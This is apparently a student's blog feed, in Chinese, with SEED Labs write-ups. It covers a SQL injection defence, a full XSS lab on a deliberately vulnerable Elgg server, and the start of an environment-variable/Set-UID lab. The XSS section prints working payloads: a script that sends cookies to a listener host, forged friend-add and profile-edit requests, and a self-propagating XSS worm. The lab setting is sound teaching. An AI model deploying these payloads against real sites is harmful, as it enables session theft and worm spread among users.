alt=""></p></li><li><p>首先url中已经指向<code>safe_home.php</code>，然后发现SQL注入失败，说明防护成功了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103325084.png" alt=""></p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><ol><li><p>修改<code>safe_home.php</code>中的语句，将指向<code>unsafe_home.php</code>的修改为<code>safe_home.php</code>，以及指向<code>unsafe_edit_frontend.php</code>的修改为<code>safe_edit_frontend.php</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103331523.png" alt=""></p></li><li><p>复制<code>unsafe_edit_backend.php</code>为<code>safe_edit_backend.php</code>，并将文件中最后指向的<code>unsafe_home.php</code>改为<code>safe_home.php</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103337254.png" alt=""></p></li><li><p>复制<code>unsafe_edit_frontend.php</code>为<code>safe_edit_frontend.php</code>，并将文件中指向的<code>unsafe_home.php</code>改为<code>safe_home.php</code>，<code>unsafe_edit_frontend.php</code>改为<code>safe_edit_frontend.php</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103347136.png" alt=""></p><p>以及<code>unsafe_edit_backend.php</code>改为<code>safe_edit_backend.php</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103353611.png" alt=""></p></li><li><p>以下是<code>safe_edit_backend.php</code>中的查询语句，这个查询将参数与数据的语句嵌在一起了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103400305.png" alt=""></p><p>修改成以下语句，将查询将参数与数据的语句分离</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103407526.png" alt=""></p></li><li><p>重新docker-compose build</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103413503.png" alt=""></p><p>重新docker-composer up</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103419668.png" alt=""></p></li><li><p>重新登录，显示Alice的工资仍然为999999</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103425087.png" alt=""></p></li><li><p>修改Alice的个人信息，首先确认指向为<code>safe_edit_frontend.php</code>，然后尝试使用SQL注入将Alice的工资改为39999</p><p>尝试sql注入，改变工资为39999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Salary=&#x27;39999<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103431971.png" alt=""></p></li><li><p>发现NickName返回了<code>',Salary='39999</code>，工资未变</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226103437741.png" alt=""></p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 7</title>
    <link href="/2024/12/26/lab7/"/>
    <url>/2024/12/26/lab7/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 7-XSS攻击实验(Elgg)</h1><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 跨站点脚本(XSS)是一种常见于web应用程序中的计算机安全漏洞。此漏洞使攻击者有可能将恶意代码（如JavaScripts）注入受害者的web浏览器。为了演示攻击者可以做什么，我们在预先构建的Ubuntu VM映像中设置了一个名为Elgg的web应用程序。我们已经注释掉了Elgg的一些保护方法，故意使其容易受到XSS攻击。学生们需要利用这些漏洞发动攻击，就像Samy Kamkar在2005年通过臭名昭著的Samy蠕虫对MySpace所做的那样。此攻击的最终目标是在用户之间传播XSS蠕虫，这样无论谁查看受感染的用户配置文件都会受到感染，无论谁受感染都会将您（即攻击者）添加到他/她的好友列表中。 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="DNS-Setup">DNS Setup</h4><ol><li><p>加载docker：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102041974.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102048386.png" alt=""></p></li><li><p>docker-compose build</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102053948.png" alt=""></p></li><li><p>docker-compose up</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102059447.png" alt=""></p></li><li><p>配置/etc/hosts，添加<code>www.seed-server.com</code>和一些测试网站的域名映射：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102105484.png" alt=""></p></li><li><p>可以打开<code>www.seed-server.com</code>了</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102111620.png" alt=""></p></li></ol><hr><h4 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window">Task 1: Posting a Malicious Message to Display an Alert Window</h4><ol><li><p>以samy的身份登入网站，修改samy的profile，将攻击代码藏入简介中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102117809.png" alt=""></p></li><li><p>保存后就能看到弹窗：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102125770.png" alt=""></p></li><li><p>返回主页也能看到：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102132639.png" alt=""></p></li></ol><p><strong>攻击成功了！</strong></p><hr><h4 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies">Task 2: Posting a Malicious Message to Display Cookies</h4><ol><li><p>修改samy中藏有的恶意代码，使其弹窗中显示cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102139768.png" alt=""></p></li><li><p>保存后弹窗中显示cookie：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102504056.png" alt=""></p></li></ol><hr><h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine">Task 3: Stealing Cookies from the Victim’s Machine</h4><ol><li><p>开启一个终端监听5555端口：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102511568.png" alt=""></p></li><li><p>将samy的profile中的恶意代码修改成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)+<span class="hljs-string">&#x27;&gt;&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102517044.png" alt=""></p></li><li><p>保存后发现被拦截了，监听端口输出cookie：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102523473.png" alt=""></p></li></ol><hr><h4 id="Task-4-Becoming-the-Victim’s-Friend">Task 4: Becoming the Victim’s Friend</h4><ol><li><p>samy添加一个好友，使用wireshark查看一下http的请求是怎么构建的：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102530885.png" alt=""></p><p>得到其中的url请求是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add?friend=58&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q<br></code></pre></td></tr></table></figure><p>所以如果要加samy为好友，其id为59，则构造的url请求应该是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add<span class="hljs-string">&quot;+&quot;</span>?friend=59<span class="hljs-string">&quot; + ts + token + ts + token</span><br></code></pre></td></tr></table></figure><p>所以构造的恶意代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> +</span><br><span class="language-javascript">            ts + token + ts + token;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>修改samy profile中的恶意代码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102539104.png" alt=""></p></li><li><p>更换Alice的账号登录，没有好友：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102544079.png" alt=""></p></li><li><p>访问samy的主页，然后发现就添加上了好友：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102549071.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102553978.png" alt=""></p></li></ol><hr><h4 id="Task-5-Modifying-the-Victim’s-Profile">Task 5: Modifying the Victim’s Profile</h4><ol><li><p>修改一下samy自己的profile：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102558610.png" alt=""></p></li><li><p>抓包之后显示url请求为：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102604446.png" alt=""></p><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__elgg_token=CL1-xOOBucqcKcYnoGR1Sg&amp;__elgg_ts=1732702506&amp;name=Samy&amp;description=&lt;p&gt;This is samy.&lt;/p&gt; &amp;accesslevel[description]=2&amp;briefdescription=&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=59<br></code></pre></td></tr></table></figure><p>所以得到了构造的恶意代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        var userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        var guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        var ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        var token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        var content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=&lt;p&gt;This is from samy.&lt;/p&gt;&amp;accesslevel[description]=2&quot;</span>+guid;<br>        var samyGuid=59;<br>        var sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            var Ajax=null;<br>            Ajax=new XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li><li><p>修改samy的profile中的恶意代码如下：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102611325.png" alt=""></p></li><li><p>alice登录后，访问samy的主页也会修改</p><p>before：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102616149.png" alt=""></p><p>访问samy后：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102620748.png" alt=""></p></li></ol><p><strong>攻击成功了！</strong></p><hr><h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm">Task 6: Writing a Self-Propagating XSS Worm</h4><h5 id="Link-Approach">Link Approach</h5><ol><li><p>使用之前搭建好的<code>www.example32.com</code>作为第三方服务器：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102627239.png" alt=""></p></li><li><p>进入apache2中的配置文件，插入<code>www.example32.com</code>的服务器名字：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102633236.png" alt=""></p></li><li><p>在容器中的<code>/var/www/csp</code>文件夹中，创建<code>xssworm.js</code>文件，将上个task中js代码中的内容复制进来，加上wormCode变量，注意使用的域名：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102638452.png" alt=""></p></li><li><p>访问<code>www.example70.com/xssworm.js</code>可以访问到js代码：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102643368.png" alt=""></p></li><li><p>将samy中profile的恶意代码改成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script  type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;http://www.example70.com/xssworm.js&quot;</span>&gt;&lt;/script&gt; <br></code></pre></td></tr></table></figure></li><li><p>以boby的身份登录，在没有点进samy主页之前：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102649007.png" alt=""></p><p>点进之后：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102658741.png" alt=""></p></li><li><p>而以charlie的身份访问boby，也会被攻击：</p><p>before：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102705199.png" alt=""></p><p>访问boby之后：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102711947.png" alt=""></p></li></ol><p><strong>说明蠕虫攻击成功了！</strong></p><hr><h5 id="DOM-Approach">DOM Approach</h5><ol><li><p>将samy的profile中的恶意代码修改如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);<br>    <br>    <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>    <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br><br>    <span class="hljs-keyword">var</span> content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=This is from samy&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + guid;<br>    <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>    &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102720231.png" alt=""></p></li><li><p>alice的简介清除之后，访问samy主页，攻击成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102726794.png" alt=""></p></li><li><p>boby的简介清除之后，访问alice主页，也可以攻击成功：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102731701.png" alt=""></p></li></ol><p><strong>说明蠕虫攻击再次实现了！</strong></p><hr><h4 id="Task-7-Defeating-XSS-Attacks-Using-CSP">Task 7: Defeating XSS Attacks Using CSP</h4><ol><li><p>原始状态</p><p><code>www.example32a.com</code>: 全都OK，弹窗也可执行：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102737421.png" alt=""></p><p><code>www.example32b.com</code>: 4 6 OK，1 2 3 5 7 Failed，弹窗不可执行：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102742232.png" alt=""></p><p><code>www.example32c.com</code>: 1 4 6 OK，2 3 5 7 Failed，弹窗不可执行：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102748242.png" alt=""></p></li><li><p>修改<code>/etc/apache2/sites-available/apache_csp.conf</code>，将<code>www.example32b.com</code>中的<code>*.example60.com</code>添加上去：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102753413.png" alt=""></p></li><li><p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32b.com</code>的5 OK了，说明csp将<code>www.example60.com</code>添加进白名单了：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102802052.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102807336.png" alt=""></p></li><li><p>修改<code>var/www/csp/phpindex.php</code>文件，添加<code>'nonce-222-222-222' *.example60.com</code>：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102812806.png" alt=""></p></li><li><p><code>service apache2 restart</code>重启apache后，可以看到<code>www.example32c.com</code>的5 OK了，说明csp将<code>www.example60.com</code>和 <code>'nonce-222-222-222'</code>添加进白名单了：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102818778.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226102823884.png" alt=""></p></li></ol><p>由此可见，csp为白名单制度，将对应的站点添加进白名单后，就能正确访问。</p><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 6</title>
    <link href="/2024/12/26/lab6/"/>
    <url>/2024/12/26/lab6/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 6-环境变量与set-uid实验</h1><p><em>前5个task是用的自己的ubuntu，从第6个开始不知道为什么做不出来，之后用的seed-ubuntu</em></p><hr><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04<br><em>包含一部分seed-ubuntu</em></li></ul><h3 id="实验内容">实验内容</h3><p><s>删掉啦</s></p><!-- 本实验的学习目标是让学生了解环境变量如何影响程序以及系统行为。环境变量是一组动态命名值，可以影响正在运行的进程将在计算机上运行。大多数操作系统都使用它们，因为它们是1979年引入Unix。尽管环境变量会影响程序行为，但它们是如何实现的这一点很多程序员都不太理解。因此，如果程序使用环境变量程序员不知道它们被使用，程序可能有漏洞。在本实验中，学生将了解环境变量是如何工作的，它们是如何从父进程到子进程，以及它们如何影响系统/程序行为。我们特别感兴趣的是如何环境变量影响Set-UID程序的行为，这些程序通常是特权程序。本实验涵盖以下主题：- 环境变量- SET-UID程序- 安全地调用外部程序- 能力泄漏- 动态加载程序/链接器 --><hr><h3 id="实验步骤">实验步骤</h3><h4 id="Task-1-Manipulating-Environment-Variables">Task 1: Manipulating Environment Variables</h4><ol><li><p>输出环境变量，使用env命令：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100447274.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100454519.png" alt=""></p></li><li><p>输出特定的环境变量：</p><ul><li><p>printenv PWD</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100500543.png" alt=""></p></li><li><p>env | grep PWD</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100512222.png" alt=""></p></li></ul></li><li><p>删除环境变量，使用unset命令</p><p>使用unset删除PWD，再使用printenv输出PWD，发现为空：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100520562.png" alt=""></p></li><li><p>设置环境变量，使用export命令</p><p>使用export设置PWD，再使用printenv输出PWD，可以得到：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100526388.png" alt=""></p></li></ol><hr><h4 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><strong>Task 2: Passing Environment Variables from Parent Process to Child Process</strong></h4><ol><li><p><code>man fork</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100532702.png" alt=""></p><p>查看fork()函数的功能：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100544032.png" alt=""></p></li></ol><hr><h5 id="Step-1-输出子进程的环境变量">Step 1. 输出子进程的环境变量</h5><ol><li><p>编辑<code>task2.c</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100551638.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100557220.png" alt=""></p></li><li><p>编译，存入<code>child.txt</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100603522.png" alt=""></p></li><li><p>输出</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100609594.png" alt=""></p></li></ol><hr><h5 id="Step-2-输出父进程的环境变量">Step 2. 输出父进程的环境变量</h5><ol><li><p>编辑<code>task2.c</code>文件，将子进程的printenv()注释掉，父进程添加printenv()：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100616911.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100622452.png" alt=""></p></li><li><p>重新编译<code>task2.c</code>并执行<code>task2</code>，将结果保存到<code>parent.txt</code>中：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100628759.png" alt=""></p></li></ol><hr><h5 id="Step-3-父-子进程环境变量的区别">Step 3. 父/子进程环境变量的区别</h5><ol><li><p>使用diff进行父/子进程环境变量的对比：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100635977.png" alt=""></p><p>没有输出，说明两次程序输出的环境变量完全相同，使用fork()函数创建的子进程的环境变量继承了父进程全部的环境变量。</p></li></ol><hr><h4 id="Task-3-Environment-Variables-and-execve"><strong>Task 3: Environment Variables and</strong> execve()</h4><ol><li><p>man execve：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100641594.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100647175.png" alt=""></p></li></ol><hr><h5 id="Step-1-编译并运行示例代码">Step 1. 编译并运行示例代码</h5><ol><li><p>创建<code>task3.c</code>文件，代码如下：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100921630.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100927394.png" alt=""></p></li><li><p>输出为空</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100934156.png" alt=""></p></li></ol><hr><h5 id="Step-2-修改函数参数">Step 2. 修改函数参数</h5><ol><li><p>修改</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100939770.png" alt=""></p></li><li><p>编译</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100946548.png" alt=""></p></li><li><p>得到了当前进程的环境变量</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100951566.png" alt=""></p></li></ol><hr><h5 id="Step-3-结论">Step 3. 结论</h5><p>将exevce()函数的第三个参数由NULL改为environ，就能够输出当前进程的环境变量。</p><p>所以原进程的环境变量，是通过将environ变量传入exceve()函数的第三个参数，从而实现环境变量的传递。</p><hr><h4 id="Task-4-Environment-Variables-and-system"><strong>Task 4: Environment Variables and</strong> system()</h4><p>通过system()函数执行新程序，探究环境变量的变化</p><ol><li><p><code>man system</code></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226100959425.png" alt=""></p></li><li><p>创建task4.c</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226101006479.png" 